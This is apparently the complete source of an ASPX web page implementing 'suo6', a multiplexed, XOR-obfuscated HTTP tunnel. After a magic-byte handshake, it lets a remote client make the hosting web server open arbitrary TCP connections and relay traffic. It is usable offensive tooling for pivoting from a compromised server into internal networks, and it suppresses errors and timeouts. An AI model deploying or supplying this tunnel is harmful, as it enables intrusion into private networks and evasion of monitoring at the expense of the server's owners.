<%@ Page Language="C#" EnableSessionState="False" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %><script runat="server">
/**
 * suo6 — multiplexed binary tunnel (ASPX edition).
 * Frame: [stream_id:2B BE][type:1B][length:2B BE][payload:length B]
 * Types: 0x01=OPEN 0x02=OPEN_ACK 0x03=DATA 0x04=FIN 0x05=PING
 *
 * XOR encoding is done ONLY in the writer thread (dequeue order) so the
 * stream-cipher byte positions always match the HTTP response byte order.
 */

    const byte T_OPEN     = 0x01;
    const byte T_OPEN_ACK = 0x02;
    const byte T_DATA     = 0x03;
    const byte T_FIN      = 0x04;
    const byte T_PING     = 0x05;

    // ── BlockingDeque for .NET 2.0+ ────────────────────────────────────────
    class BlockingDeque {
        private LinkedList<byte[]> _q = new LinkedList<byte[]>();
        private object _lock = new object();

        public void PutLast(byte[] item) {
            lock (_lock) { _q.AddLast(item); Monitor.Pulse(_lock); }
        }
        public void PutFirst(byte[] item) {
            lock (_lock) { _q.AddFirst(item); Monitor.Pulse(_lock); }
        }
        public byte[] Poll(int timeoutMs) {
            lock (_lock) {
                DateTime end = DateTime.Now.AddMilliseconds(timeoutMs);
                while (_q.Count == 0) {
                    int rem = (int)(end - DateTime.Now).TotalMilliseconds;
                    if (rem <= 0 || !Monitor.Wait(_lock, rem)) return null;
                }
                byte[] v = _q.First.Value; _q.RemoveFirst(); return v;
            }
        }
        public byte[] TryPoll() {
            lock (_lock) {
                if (_q.Count == 0) return null;
                byte[] v = _q.First.Value; _q.RemoveFirst(); return v;
            }
        }
    }

    // ── I/O helpers ────────────────────────────────────────────────────────
    void S6ReadFull(Stream s, byte[] buf) {
        int off = 0;
        while (off < buf.Length) {
            int n = s.Read(buf, off, buf.Length - off);
            if (n <= 0) throw new IOException("EOF");
            off += n;
        }
    }

    bool S6ReadOrEof(Stream s, byte[] buf) {
        int b = s.ReadByte();
        if (b < 0) return false;
        buf[0] = (byte)b;
        int off = 1;
        while (off < buf.Length) {
            int n = s.Read(buf, off, buf.Length - off);
            if (n <= 0) throw new IOException("EOF mid-frame");
            off += n;
        }
        return true;
    }

    byte[] S6BuildRaw(int sid, byte typ, byte[] payload) {
        byte[] f = new byte[5 + payload.Length];
        f[0] = (byte)((sid >> 8) & 0xff);
        f[1] = (byte)(sid & 0xff);
        f[2] = typ;
        f[3] = (byte)((payload.Length >> 8) & 0xff);
        f[4] = (byte)(payload.Length & 0xff);
        if (payload.Length > 0) Array.Copy(payload, 0, f, 5, payload.Length);
        return f;
    }

    void S6XorEncode(byte[] frame, byte[] key, int[] pos) {
        for (int i = 0; i < frame.Length; i++) frame[i] ^= key[pos[0]++ & 15];
    }

    void S6EnqueueFirst(BlockingDeque q, byte[] f) { try { q.PutFirst(f); } catch { } }
    void S6Enqueue(BlockingDeque q, byte[] f)      { try { q.PutLast(f);  } catch { } }

    void S6DoClose(int sid, Hashtable streams, BlockingDeque q, bool[] done) {
        TcpClient c = null;
        lock (streams) {
            c = streams[sid] as TcpClient;
            streams.Remove(sid);
        }
        if (c != null) try { c.Close(); } catch { }
        if (!done[0]) S6EnqueueFirst(q, S6BuildRaw(sid, T_FIN, new byte[0]));
    }

    // ── main handler ───────────────────────────────────────────────────────
    void S6HandleConn() {
        Stream httpIn  = Request.InputStream;
        Stream httpOut = Response.OutputStream;

        Response.Buffer       = false;
        Response.ContentType  = "application/octet-stream";
        Response.AddHeader("X-Accel-Buffering", "no");
        Response.AddHeader("Cache-Control",     "no-cache, no-store");

        // Handshake
        byte[] magic = new byte[4]; S6ReadFull(httpIn, magic);
        if (magic[0] != 0x53 || magic[1] != 0x36 || magic[2] != 0x00 || magic[3] != 0x01) return;
        byte[] clientSeed = new byte[16]; S6ReadFull(httpIn, clientSeed);

        byte[] serverSeed = new byte[16]; new RNGCryptoServiceProvider().GetBytes(serverSeed);
        byte[] key = new byte[16];
        for (int i = 0; i < 16; i++) key[i] = (byte)(clientSeed[i] ^ serverSeed[i]);

        httpOut.Write(new byte[]{0x53, 0x36, 0x00, 0x01}, 0, 4);
        httpOut.Write(serverSeed, 0, 16);
        httpOut.Flush();
        Response.Flush();

        // Session state
        BlockingDeque s2cQ   = new BlockingDeque();
        Hashtable     streams = Hashtable.Synchronized(new Hashtable());
        bool[]        done    = {false};
        int[]         s2cPos  = {0};
        int[]         c2sPos  = {0};

        // Writer thread
        Stream  fOut = httpOut;
        byte[]  fKey = key;
        int[]   fPos = s2cPos;
        bool[]  fDone = done;
        BlockingDeque fQ = s2cQ;

        Thread wt = new Thread(delegate() {
            try {
                while (!fDone[0]) {
                    byte[] f = fQ.Poll(5000);
                    if (f == null) continue;
                    if (f.Length == 0) break;
                    S6XorEncode(f, fKey, fPos);
                    fOut.Write(f, 0, f.Length);
                    for (int i = 0; i < 31; i++) {
                        byte[] g = fQ.TryPoll();
                        if (g == null) break;
                        if (g.Length == 0) { fOut.Flush(); fDone[0] = true; return; }
                        S6XorEncode(g, fKey, fPos);
                        fOut.Write(g, 0, g.Length);
                    }
                    fOut.Flush();
                }
            } catch { }
            finally { fDone[0] = true; }
        });
        wt.IsBackground = true;
        wt.Start();

        // c2s frame-read loop
        byte[] hdr = new byte[5];
        try {
            while (!done[0]) {
                if (!S6ReadOrEof(httpIn, hdr)) break;
                for (int i = 0; i < 5; i++) hdr[i] ^= key[c2sPos[0]++ & 15];

                int  sid = ((hdr[0] & 0xff) << 8) | (hdr[1] & 0xff);
                byte typ = hdr[2];
                int  len = ((hdr[3] & 0xff) << 8) | (hdr[4] & 0xff);

                byte[] payload = new byte[len];
                if (len > 0) {
                    S6ReadFull(httpIn, payload);
                    for (int i = 0; i < len; i++) payload[i] ^= key[c2sPos[0]++ & 15];
                }

                int fSid = sid;
                switch (typ) {
                    case T_PING:
                        S6EnqueueFirst(s2cQ, S6BuildRaw(0, T_PING, new byte[0]));
                        break;

                    case T_OPEN: {
                        if (len < 3) break;
                        int port = ((payload[0] & 0xff) << 8) | (payload[1] & 0xff);
                        string host = System.Text.Encoding.UTF8.GetString(payload, 2, len - 2);
                        Hashtable fStr = streams;
                        bool[]    fD   = done;
                        BlockingDeque fQc = s2cQ;
                        ThreadPool.QueueUserWorkItem(delegate {
                            TcpClient tc = null;
                            try {
                                tc = new TcpClient();
                                tc.NoDelay            = true;
                                tc.ReceiveBufferSize  = 256 * 1024;
                                tc.SendBufferSize     = 256 * 1024;
                                IAsyncResult ar = tc.BeginConnect(host, port, null, null);
                                if (!ar.AsyncWaitHandle.WaitOne(10000)) throw new Exception("timeout");
                                tc.EndConnect(ar);
                            } catch {
                                S6EnqueueFirst(fQc, S6BuildRaw(fSid, T_OPEN_ACK, new byte[]{0x01}));
                                if (tc != null) try { tc.Close(); } catch { }
                                return;
                            }
                            lock (fStr) { fStr[fSid] = tc; }
                            S6EnqueueFirst(fQc, S6BuildRaw(fSid, T_OPEN_ACK, new byte[]{0x00}));
                            // socket reader
                            byte[] buf = new byte[8 * 1024];
                            try {
                                NetworkStream ns = tc.GetStream();
                                int n;
                                while (!fD[0] && (n = ns.Read(buf, 0, buf.Length)) > 0) {
                                    byte[] p = new byte[n];
                                    Array.Copy(buf, p, n);
                                    S6Enqueue(fQc, S6BuildRaw(fSid, T_DATA, p));
                                }
                            } catch { }
                            finally {
                                if (!fD[0]) S6EnqueueFirst(fQc, S6BuildRaw(fSid, T_FIN, new byte[0]));
                                try { tc.Close(); } catch { }
                                lock (fStr) { fStr.Remove(fSid); }
                            }
                        });
                        break;
                    }

                    case T_DATA: {
                        TcpClient tc = null;
                        lock (streams) { tc = streams[sid] as TcpClient; }
                        if (tc != null && tc.Connected && len > 0) {
                            try { tc.GetStream().Write(payload, 0, len); tc.GetStream().Flush(); }
                            catch { S6DoClose(sid, streams, s2cQ, done); }
                        }
                        break;
                    }

                    case T_FIN:
                        S6DoClose(sid, streams, s2cQ, done);
                        break;
                }
            }
        } finally {
            done[0] = true;
            lock (streams) {
                foreach (TcpClient tc in streams.Values)
                    try { tc.Close(); } catch { }
                streams.Clear();
            }
            try { s2cQ.PutFirst(new byte[0]); } catch { }
            wt.Join(3000);
        }
    }
</script><%
    Server.ScriptTimeout = int.MaxValue;
    try { S6HandleConn(); } catch { }
%>
